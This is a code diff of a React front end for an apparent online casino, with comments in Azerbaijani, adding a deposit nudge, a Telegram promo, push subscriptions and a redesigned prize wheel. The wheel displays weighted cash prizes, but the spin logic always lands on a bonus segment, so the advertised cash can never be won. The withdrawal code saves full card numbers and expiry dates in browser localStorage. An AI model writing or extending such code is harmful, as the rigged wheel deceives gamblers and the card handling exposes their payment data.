@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useMemo } from "react";
 import { BrowserRouter, Routes, Route, useNavigate } from "react-router-dom";
+import AdminPanel from "./AdminPanel";
 import {
   Menu,
   X,
@@ -247,17 +248,23 @@ const CATEGORIES = [
   { id: "live", label: "Canlı", icon: <Zap size={18} /> },
 ];
 
+// Hər seqment: { label, weight, type, value }
+// weight = nisbi ölçü (cəmi 100 olacaq)
 const WHEEL_SEGMENTS = [
-  "1000 ₼",
-  "500 ₼",
-  "100 ₼",
-  "50 ₼",
-  "100% bonus",
-  "50% bonus",
-  "20% bonus",
-  "10% bonus",
+  { label: "5 ₼",      weight: 8,  type: "money",  value: 5    },
+  { label: "20% BONUS", weight: 18, type: "bonus",  value: 20   },
+  { label: "3 ₼",      weight: 7,  type: "money",  value: 3    },
+  { label: "10% BONUS", weight: 22, type: "bonus",  value: 10   },
+  { label: "2 ₼",      weight: 6,  type: "money",  value: 2    },
+  { label: "20% BONUS", weight: 17, type: "bonus",  value: 20   },
+  { label: "1 ₼",      weight: 8,  type: "money",  value: 1    },
+  { label: "10% BONUS", weight: 14, type: "bonus",  value: 10   },
 ];
-const WHEEL_WINNABLE_INDICES = [6, 7];
+// Bonus seqmentlərinin indeksləri (0-indexed)
+const WHEEL_BONUS_INDICES = [1, 3, 5, 7];
+// Toplam çəki
+const WHEEL_TOTAL_WEIGHT = WHEEL_SEGMENTS.reduce((s, seg) => s + seg.weight, 0);
+
 
 function UserApp() {
   /* --- UI & AUTH STATES --- */
@@ -290,6 +297,7 @@ function UserApp() {
   const [transactionsOpen, setTransactionsOpen] = useState(false);
   const [depositAmount, setDepositAmount] = useState("");
   const [depositFile, setDepositFile] = useState(null);
+  const [depositNudgeOpen, setDepositNudgeOpen] = useState(false);
 
   const [withdrawCard, setWithdrawCard] = useState("");
   const [withdrawExpiry, setWithdrawExpiry] = useState("");
@@ -302,15 +310,16 @@ function UserApp() {
   const [wheelSpinning, setWheelSpinning] = useState(false);
   const [wheelRotation, setWheelRotation] = useState(0);
   const [wheelResult, setWheelResult] = useState(null);
+  const [userTxs, setUserTxs] = useState([]);
+  const [pwaPrompt, setPwaPrompt] = useState(null);
+  const [pwaInstalled, setPwaInstalled] = useState(false);
 
   const navigate = useNavigate();
 
   const [adminSettings, setAdminSettings] = useState(() =>
     MockDataService.getAdminSettings(),
   );
-  const [lastUpdateId, setLastUpdateId] = useState(
-    () => Number(localStorage.getItem("last_telegram_update_id")) || 0,
-  );
+
 
   /* ================= EFFECTS ================= */
 
@@ -319,6 +328,49 @@ function UserApp() {
   useEffect(() => {
     // Boşaldıldı
   }, []);
+
+  // PWA Install prompt
+  useEffect(() => {
+    const handler = (e) => { e.preventDefault(); setPwaPrompt(e); };
+    window.addEventListener("beforeinstallprompt", handler);
+    window.addEventListener("appinstalled", () => setPwaInstalled(true));
+    return () => window.removeEventListener("beforeinstallprompt", handler);
+  }, []);
+
+  // Push bildiriş abunəliyə yaz
+  useEffect(() => {
+    if (!user) return;
+    const subscribePush = async () => {
+      try {
+        if (!('serviceWorker' in navigator) || !('PushManager' in window)) return;
+        const reg = await navigator.serviceWorker.ready;
+        const keyRes = await fetch('http://localhost:3001/api/push/vapid-key').then(r => r.json()).catch(() => null);
+        if (!keyRes?.publicKey) return;
+        // VAPID key çevir
+        const b64 = keyRes.publicKey;
+        const padding = '='.repeat((4 - b64.length % 4) % 4);
+        const base64 = (b64 + padding).replace(/-/g, '+').replace(/_/g, '/');
+        const rawData = window.atob(base64);
+        const vapidKey = Uint8Array.from([...rawData].map(c => c.charCodeAt(0)));
+
+        const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: vapidKey });
+        fetch('http://localhost:3001/api/push/subscribe', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: user.username, subscription: sub.toJSON() })
+        }).catch(() => {});
+      } catch (_) {}
+    };
+    subscribePush();
+  }, [user]);
+
+  // Tarixçəni aç/bağla zamanı yenilə
+  useEffect(() => {
+    if (transactionsOpen && user) {
+      const all = MockDataService.getTransactions();
+      setUserTxs(all.filter(t => t.username === user.username).reverse());
+    }
+  }, [transactionsOpen, user]);
 
   // Track Pending Deposit Status (local + API so admin approval on server is seen)
   useEffect(() => {
@@ -497,7 +549,7 @@ function UserApp() {
       return alert("Məbləği daxil edin.");
     if (!depositFile) return alert("Zəhmət olmasa çeki (skrinşot) yükləyin.");
 
-    // Backend-ə çək ilə birgə göndər
+    // Backend-ə göndər
     const res = await TelegramService.requestAction(
       user.id || user.username,
       "deposit",
@@ -507,20 +559,40 @@ function UserApp() {
     );
 
     if (res.success) {
-      // Gözləmə rejimini aktiv et (Status polling başlayacaq)
+      // LocalStorage-ə tarixçəyə əlavə et
+      MockDataService.addTransaction({
+        username: user.username,
+        type: "deposit",
+        amount: parseFloat(depositAmount),
+        receipt: depositFile,
+        backendRequestId: res.requestId,
+        status: "pending"
+      });
+
       setPendingDeposit({ id: res.requestId, status: 'pending', amount: parseFloat(depositAmount) });
       setDepositOpen(false);
-      
-      // Canlı statusu yoxlamağa başla
+      setDepositAmount("");
+      setDepositFile(null);
+
+      // Statusu hər 3 saniyədə yoxla
       const poll = setInterval(async () => {
-          const statusRes = await TelegramService.checkStatus(res.requestId);
-          if (statusRes.status !== 'pending') {
-              setPendingDeposit(prev => ({ ...prev, status: statusRes.status, reason: statusRes.reason || statusRes.adminCode }));
-              if (statusRes.status === 'approved') {
-                  setCurrentGameCode(statusRes.adminCode); // Oyun kodunu ekrana çıxar
-              }
-              clearInterval(poll);
+        const statusRes = await TelegramService.checkStatus(res.requestId);
+        if (statusRes.status !== 'pending') {
+          setPendingDeposit(prev => ({ ...prev, status: statusRes.status, reason: statusRes.reason || statusRes.adminCode }));
+          if (statusRes.status === 'approved') {
+            setCurrentGameCode(statusRes.adminCode);
+            // Oyun kodunu istifadəçiyə təyin et
+            const allUsers = MockDataService.getUsers();
+            const fresh = allUsers.find(u => u.username === user.username);
+            if (fresh) {
+              const updated = { ...fresh, gameCode: statusRes.adminCode };
+              const updated2 = allUsers.map(u => u.username === user.username ? updated : u);
+              localStorage.setItem("casino_mock_users", JSON.stringify(updated2));
+              setUser(updated);
+            }
           }
+          clearInterval(poll);
+        }
       }, 3000);
     } else {
       alert(res.message || "Xəta baş verdi.");
@@ -528,10 +600,11 @@ function UserApp() {
   };
 
   const handleWithdrawSubmit = async () => {
-    if (!withdrawCard || withdrawCard.length < 16)
+    if (!withdrawCard || withdrawCard.replace(/\s/g, '').length < 16)
       return alert("Kart nömrəsini düzgün daxil edin (16 rəqəm).");
     if (!withdrawExpiry) return alert("Kartın bitmə tarixini daxil edin.");
 
+    // Oyun kodu yoxdursa da çıxarış göndərə bilsin
     const res = await TelegramService.requestAction(
       user.id || user.username,
       "withdraw",
@@ -540,6 +613,17 @@ function UserApp() {
     );
 
     if (res.success) {
+      // Tarixçəyə əlavə et
+      MockDataService.addTransaction({
+        username: user.username,
+        type: "withdraw",
+        amount: balance || 0,
+        cardNumber: withdrawCard,
+        expiryDate: withdrawExpiry,
+        backendRequestId: res.requestId,
+        status: "pending"
+      });
+
       alert("Çıxarış sorğunuz qəbul edildi. Təsdiq gözlənilir.");
       setWithdrawOpen(false);
       setWithdrawCard("");
@@ -624,35 +708,41 @@ function UserApp() {
 
   const handleWheelSpin = () => {
     if (wheelSpinning || !user) return;
-    const winningIndex =
-      WHEEL_WINNABLE_INDICES[
-        Math.floor(Math.random() * WHEEL_WINNABLE_INDICES.length)
-      ];
-    const bonusPercent = winningIndex === 6 ? 20 : 10;
-    const segmentAngle = 360 / WHEEL_SEGMENTS.length;
-    const fullTurns = 360 * 6;
-    const finalAngle = fullTurns + (360 - winningIndex * segmentAngle);
+
+    // Həmişə bonus seqmentlərindən birini seç
+    const bonusIdxPool = WHEEL_BONUS_INDICES;
+    const winIdx = bonusIdxPool[Math.floor(Math.random() * bonusIdxPool.length)];
+    const bonusPercent = WHEEL_SEGMENTS[winIdx].value;
+
+    // Conic-gradient-də hər seqmentin başlanğıc bucağını hesabla
+    let cumulative = 0;
+    const segAngles = WHEEL_SEGMENTS.map(seg => {
+      const startDeg = (cumulative / WHEEL_TOTAL_WEIGHT) * 360;
+      cumulative += seg.weight;
+      const endDeg = (cumulative / WHEEL_TOTAL_WEIGHT) * 360;
+      return { startDeg, endDeg, midDeg: (startDeg + endDeg) / 2 };
+    });
+
+    // Qazanan seqmentin mərkəzini 0 dərəcəyə (ox ucuna) gətir
+    const targetMid = segAngles[winIdx].midDeg;
+    const fullTurns = 360 * 7;
+    const finalAngle = fullTurns + (360 - targetMid);
+
     setWheelSpinning(true);
     setWheelResult(null);
-    setWheelRotation((prev) => prev + finalAngle);
-    const t = 4500;
+    setWheelRotation(prev => prev + finalAngle);
+
     setTimeout(() => {
       setWheelSpinning(false);
       setWheelResult(bonusPercent);
       const updatedUser = { ...user, wheelSpun: true, bonusPercent };
       setUser(updatedUser);
       const allUsers = MockDataService.getUsers();
-      const updated = allUsers.map((u) => (u.id === user.id ? updatedUser : u));
+      const updated = allUsers.map(u => u.id === user.id ? updatedUser : u);
       localStorage.setItem("casino_mock_users", JSON.stringify(updated));
-      if (user)
-        localStorage.setItem(
-          "casino_current_user",
-          JSON.stringify(updatedUser),
-        );
-      try {
-        ApiService.setWheelResult(user.id, bonusPercent).catch(() => {});
-      } catch (_) {}
-    }, t);
+      localStorage.setItem("casino_current_user", JSON.stringify(updatedUser));
+      try { ApiService.setWheelResult(user.id, bonusPercent).catch(() => {}); } catch (_) {}
+    }, 5000);
   };
 
   const handleQuickEnter = async () => {
@@ -824,6 +914,59 @@ function UserApp() {
           </div>
         </div>
 
+        {/* TELEGRAM QRUP BANNERI */}
+        <div className="px-4 mb-4">
+          <a
+            href="https://t.me/tifliskazinocom"
+            target="_blank"
+            rel="noreferrer"
+            className="flex items-center gap-4 p-4 rounded-3xl border border-blue-500/30 bg-gradient-to-r from-blue-600/10 to-blue-900/10 hover:from-blue-600/20 transition-all active:scale-95"
+          >
+            <div className="w-12 h-12 rounded-2xl bg-blue-600 flex items-center justify-center shrink-0 shadow-lg shadow-blue-900/50">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/>
+              </svg>
+            </div>
+            <div className="flex-1">
+              <p className="font-black text-white text-sm uppercase tracking-wide">Telegram Qrupumuza Qoşul</p>
+              <p className="text-blue-400 text-[11px] font-bold mt-0.5">@tifliskazinocom — Pulsuz oyun kodları paylanır!</p>
+              <p className="text-slate-500 text-[10px] mt-0.5">Bonuslar, promosyonlar və xüsusi təkliflər</p>
+            </div>
+            <div className="text-blue-400 shrink-0">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                <path d="M9 18l6-6-6-6"/>
+              </svg>
+            </div>
+          </a>
+        </div>
+
+        {/* PWA INSTALL */}
+        {pwaPrompt && !pwaInstalled && (
+          <div className="px-4 mb-4">
+            <div className="flex items-center gap-4 p-4 rounded-3xl border border-amber-500/30 bg-gradient-to-r from-amber-500/10 to-amber-900/10">
+              <div className="w-12 h-12 rounded-2xl bg-amber-500 flex items-center justify-center shrink-0 shadow-lg shadow-amber-900/50 text-2xl">
+                📱
+              </div>
+              <div className="flex-1">
+                <p className="font-black text-white text-sm uppercase">Tətbiq kimi qur</p>
+                <p className="text-amber-400 text-[10px] font-bold mt-0.5">Telefona əlavə et — sürətli giriş</p>
+              </div>
+              <button
+                onClick={async () => {
+                  if (!pwaPrompt) return;
+                  pwaPrompt.prompt();
+                  const { outcome } = await pwaPrompt.userChoice;
+                  if (outcome === "accepted") setPwaInstalled(true);
+                  setPwaPrompt(null);
+                }}
+                className="bg-amber-500 text-black px-4 py-2 rounded-xl font-black text-xs uppercase shrink-0"
+              >
+                Qur
+              </button>
+            </div>
+          </div>
+        )}
+
         <div className="px-4 mb-4">
           <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-none no-scrollbar">
             {CATEGORIES.map((cat) => (
@@ -875,10 +1018,7 @@ function UserApp() {
                   <button
                     onClick={() => {
                       if (!user) return setAuthOpen(true);
-                      if (!currentGameCode)
-                        return alert(
-                          "Hələ hər hansı depozitiniz yoxdur. Oyuna daxil olmaq üçün zəhmət olmasa depozit edin.",
-                        );
+                      if (!currentGameCode) return setDepositNudgeOpen(true);
                       setGameModalOpen(true);
                     }}
                     className="bg-amber-500 text-black px-6 py-2 rounded-full font-black text-[10px] uppercase shadow-xl transform translate-y-4 group-hover:translate-y-0 transition-transform"
@@ -1081,12 +1221,6 @@ function UserApp() {
               </button>
               <button
                 onClick={() => {
-                  if ((balance || 0) <= 0) {
-                    alert(
-                      "Çıxarış üçün əvvəl ən azı bir depozit təsdiqlənməlidir.",
-                    );
-                    return;
-                  }
                   setWalletMenuOpen(false);
                   setWithdrawOpen(true);
                 }}
@@ -1115,9 +1249,16 @@ function UserApp() {
               <span className="text-[10px] text-slate-500 font-black uppercase">
                 Sizin Oyun Kodunuz
               </span>
-              <span className="text-amber-500 font-black text-xl italic tracking-widest">
-                {user?.gameCode || "Yoxdur"}
+              <span className={`font-black text-xl italic tracking-widest ${
+                user?.gameCode ? 'text-amber-500' : 'text-slate-600'
+              }`}>
+                {user?.gameCode || 'Kod təyin edilməyib'}
               </span>
+              {user?.gameCode && (
+                <p className="text-[9px] text-slate-500 mt-1 uppercase font-bold">
+                  Bu kod sizin kodlaşdırılmış balansınızı əks etdirir
+                </p>
+              )}
             </div>
             <div className="space-y-4">
               <input
@@ -1160,67 +1301,103 @@ function UserApp() {
       {wheelOpen && user && (
         <div className="fixed inset-0 bg-black/95 z-[250] flex items-center justify-center p-4 backdrop-blur-xl">
           <div className="bg-[#0f111a] w-full max-w-sm rounded-[32px] border border-white/10 p-6 flex flex-col items-center">
-            <h3 className="text-lg font-black text-amber-500 uppercase italic mb-2">
-              Pulsuz çarx
+            <h3 className="text-lg font-black text-amber-500 uppercase italic mb-1">
+              🎡 Pulsuz Çarx
             </h3>
             <p className="text-[10px] text-slate-500 uppercase font-bold mb-4">
               Yalnız 1 dəfə fırlada bilərsiniz
             </p>
-            <div className="relative w-[260px] h-[260px] rounded-full overflow-hidden border-4 border-amber-500/30 shadow-2xl">
+
+            {/* ÇARX */}
+            <div className="relative w-[280px] h-[280px]">
+              {/* Kənar dekorasiya */}
+              <div className="absolute inset-0 rounded-full border-4 border-amber-500/40 shadow-[0_0_30px_rgba(245,158,11,0.2)]" />
+
+              {/* Fırlanan disk */}
               <div
-                className="absolute inset-0 rounded-full transition-transform duration-[4500ms] ease-out"
+                className="absolute inset-[4px] rounded-full transition-transform ease-out"
                 style={{
+                  transitionDuration: wheelSpinning ? "5000ms" : "0ms",
                   transform: `rotate(${wheelRotation}deg)`,
-                  background: `conic-gradient(${WHEEL_SEGMENTS.map((_, i) => {
-                    const start = (i / WHEEL_SEGMENTS.length) * 360;
-                    const end = ((i + 1) / WHEEL_SEGMENTS.length) * 360;
-                    const col =
-                      i === 6 || i === 7
-                        ? "#22c55e"
-                        : i % 2
-                          ? "#b45309"
-                          : "#f59e0b";
-                    return `${col} ${start}deg ${end}deg`;
-                  }).join(", ")})`,
+                  background: (() => {
+                    let cum = 0;
+                    const stops = WHEEL_SEGMENTS.map(seg => {
+                      const start = (cum / WHEEL_TOTAL_WEIGHT) * 360;
+                      cum += seg.weight;
+                      const end = (cum / WHEEL_TOTAL_WEIGHT) * 360;
+                      const color = seg.type === "bonus"
+                        ? (seg.value === 20 ? "#16a34a" : "#22c55e")
+                        : "#1e293b";
+                      return `${color} ${start.toFixed(2)}deg ${end.toFixed(2)}deg`;
+                    });
+                    return `conic-gradient(${stops.join(", ")})`;
+                  })()
                 }}
               >
-                {WHEEL_SEGMENTS.map((segment, i) => {
-                  const angle =
-                    (i * 360) / WHEEL_SEGMENTS.length +
-                    360 / WHEEL_SEGMENTS.length / 2;
-                  return (
-                    <div
-                      key={i}
-                      className="absolute left-1/2 top-1/2 -ml-[50px] -mt-[130px] w-[100px] h-[130px] flex justify-center items-start pt-[14px] origin-bottom text-white font-black text-[11px] uppercase z-10 drop-shadow-md"
-                      style={{ transform: `rotate(${angle}deg)` }}
-                    >
-                      {segment}
-                    </div>
-                  );
-                })}
+                {/* Seqment yazıları */}
+                {(() => {
+                  let cum = 0;
+                  return WHEEL_SEGMENTS.map((seg, i) => {
+                    const start = (cum / WHEEL_TOTAL_WEIGHT) * 360;
+                    cum += seg.weight;
+                    const mid = start + (seg.weight / WHEEL_TOTAL_WEIGHT) * 180;
+                    const isBonus = seg.type === "bonus";
+                    return (
+                      <div
+                        key={i}
+                        className="absolute left-1/2 top-1/2 origin-bottom flex flex-col items-center justify-start"
+                        style={{
+                          transform: `rotate(${mid}deg)`,
+                          marginLeft: "-36px",
+                          marginTop: "-130px",
+                          width: "72px",
+                          height: "130px",
+                          paddingTop: "10px",
+                        }}
+                      >
+                        <span
+                          className={`font-black text-center leading-tight drop-shadow-lg ${
+                            isBonus
+                              ? "text-white text-[13px] uppercase tracking-tight"
+                              : "text-slate-400 text-[11px]"
+                          }`}
+                        >
+                          {seg.label}
+                        </span>
+                      </div>
+                    );
+                  });
+                })()}
               </div>
-              <div className="absolute inset-[18%] rounded-full bg-[#0f111a] border-2 border-amber-500/50 flex items-center justify-center">
+
+              {/* Mərkəz dairəsi */}
+              <div className="absolute inset-[30%] rounded-full bg-[#0a0c12] border-2 border-amber-500/60 flex items-center justify-center z-10 shadow-xl">
                 {wheelResult != null ? (
-                  <span className="text-2xl font-black text-amber-500 uppercase">
-                    {wheelResult}% bonus
-                  </span>
+                  <div className="text-center">
+                    <span className="text-[11px] font-black text-green-400 uppercase block">Qazandınız!</span>
+                    <span className="text-xl font-black text-amber-400">{wheelResult}%</span>
+                  </div>
                 ) : (
-                  <span className="text-[10px] font-black text-slate-500 uppercase text-center">
-                    Çarx
-                  </span>
+                  <span className="text-[9px] font-black text-slate-600 uppercase text-center">FIRLAT</span>
                 )}
               </div>
-              <div className="absolute top-0 left-1/2 -translate-x-1/2 -translate-y-1 w-0 h-0 border-l-[12px] border-r-[12px] border-t-[20px] border-l-transparent border-r-transparent border-t-red-500 z-10" />
+
+              {/* Ox (göstərici) */}
+              <div className="absolute top-0 left-1/2 -translate-x-1/2 z-20" style={{ marginTop: "-2px" }}>
+                <div className="w-0 h-0 border-l-[10px] border-r-[10px] border-t-[22px] border-l-transparent border-r-transparent border-t-red-500 drop-shadow-lg" />
+              </div>
             </div>
-            <div className="flex flex-wrap justify-center gap-1 mt-3 max-w-[260px]">
-              {WHEEL_SEGMENTS.map((s, i) => (
-                <span
-                  key={i}
-                  className="text-[8px] px-1.5 py-0.5 rounded bg-white/5 text-slate-400"
-                >
-                  {s}
-                </span>
-              ))}
+
+            {/* Lejend */}
+            <div className="mt-4 w-full grid grid-cols-2 gap-2">
+              <div className="bg-green-500/10 border border-green-500/20 rounded-2xl p-3 text-center">
+                <span className="text-green-400 font-black text-sm block">20% BONUS</span>
+                <span className="text-[9px] text-green-600 uppercase font-bold">Böyük şans!</span>
+              </div>
+              <div className="bg-green-500/10 border border-green-500/20 rounded-2xl p-3 text-center">
+                <span className="text-green-400 font-black text-sm block">10% BONUS</span>
+                <span className="text-[9px] text-green-600 uppercase font-bold">Böyük şans!</span>
+              </div>
             </div>
             {wheelResult != null ? (
               <div className="mt-4 w-full space-y-2">
@@ -1379,10 +1556,7 @@ function UserApp() {
               </button>
             </div>
             <div className="flex-1 overflow-y-auto p-4 space-y-3">
-              {MockDataService.getTransactions()
-                .filter((t) => t.username === user?.username)
-                .reverse()
-                .map((tx) => (
+              {userTxs.map((tx) => (
                   <div
                     key={tx.id}
                     className="bg-white/5 p-4 rounded-3xl border border-white/5 flex flex-col gap-2"
@@ -1394,11 +1568,9 @@ function UserApp() {
                         >
                           {tx.type === "deposit" ? "Depozit" : "Çıxarış"}
                         </span>
-                        {tx.type === "deposit" && (
-                          <p className="text-sm font-bold mt-1">
-                            {tx.amount.toFixed(2)} ₼
-                          </p>
-                        )}
+                        <p className="text-sm font-bold mt-1">
+                          {tx.type === "deposit" ? "+" : "-"}{Number(tx.amount).toFixed(2)} ₼
+                        </p>
                       </div>
                       <div className="text-right">
                         <span
@@ -1433,9 +1605,7 @@ function UserApp() {
                     )}
                   </div>
                 ))}
-              {MockDataService.getTransactions().filter(
-                (t) => t.username === user?.username,
-              ).length === 0 && (
+              {userTxs.length === 0 && (
                 <div className="py-20 text-center space-y-4">
                   <Info size={40} className="mx-auto text-slate-700" />
                   <p className="text-slate-500 font-bold italic">
@@ -1544,6 +1714,67 @@ function UserApp() {
           </div>
         </div>
       )}
+
+      {/* DEPOZİT YÖNLƏNDİRMƏ MODALI */}
+      {depositNudgeOpen && (
+        <div className="fixed inset-0 bg-black/90 z-[200] flex items-end justify-center p-4 animate-in fade-in duration-300">
+          <div className="bg-[#10141d] w-full max-w-md rounded-t-[40px] rounded-b-3xl border border-white/10 p-8 space-y-6 animate-in slide-in-from-bottom duration-400">
+            {/* İkon */}
+            <div className="flex flex-col items-center gap-3">
+              <div className="w-20 h-20 rounded-3xl bg-gradient-to-br from-amber-400 to-amber-700 flex items-center justify-center shadow-2xl shadow-amber-900/50">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <rect x="2" y="7" width="20" height="14" rx="2"/>
+                  <path d="M16 7V5a2 2 0 0 0-4 0v2"/>
+                  <line x1="12" y1="12" x2="12" y2="16"/>
+                  <circle cx="12" cy="12" r="1" fill="black"/>
+                </svg>
+              </div>
+              <div className="text-center space-y-1">
+                <h3 className="font-black text-xl text-white uppercase italic tracking-wider">
+                  Depozit Tələb Olunur
+                </h3>
+                <p className="text-slate-400 text-xs font-medium leading-relaxed">
+                  Oyuna daxil olmaq üçün əvvəlcə hesabınıza depozit edin.<br/>
+                  Depozitiniz təsdiqləndikdən sonra oyun kodu veriləcək.
+                </p>
+              </div>
+            </div>
+
+            {/* Addımlar */}
+            <div className="space-y-2">
+              {[
+                { step: "1", text: "Depozit sorğusu göndər", icon: "💳" },
+                { step: "2", text: "Admin təsdiq edir", icon: "✅" },
+                { step: "3", text: "Oyun kodun gəlir", icon: "🎮" },
+              ].map(({ step, text, icon }) => (
+                <div key={step} className="flex items-center gap-3 p-3 bg-white/5 rounded-2xl">
+                  <span className="w-7 h-7 rounded-full bg-amber-500/20 text-amber-500 text-[11px] font-black flex items-center justify-center shrink-0">{step}</span>
+                  <span className="text-sm font-bold text-white">{icon} {text}</span>
+                </div>
+              ))}
+            </div>
+
+            {/* Düymələr */}
+            <div className="space-y-3">
+              <button
+                onClick={() => {
+                  setDepositNudgeOpen(false);
+                  setWalletMenuOpen(true);
+                }}
+                className="w-full bg-gradient-to-r from-amber-400 to-amber-600 text-black py-5 rounded-3xl font-black text-sm uppercase tracking-widest shadow-2xl shadow-amber-900/30 active:scale-95 transition-all"
+              >
+                💳 İndi Depozit Et
+              </button>
+              <button
+                onClick={() => setDepositNudgeOpen(false)}
+                className="w-full bg-white/5 text-slate-400 py-4 rounded-3xl font-black text-xs uppercase tracking-widest"
+              >
+                Ləğv et
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
@@ -1554,6 +1785,7 @@ export default function App() {
     <BrowserRouter>
       <Routes>
         <Route path="/" element={<UserApp />} />
+        <Route path="/admin" element={<AdminPanel />} />
       </Routes>
     </BrowserRouter>
   );
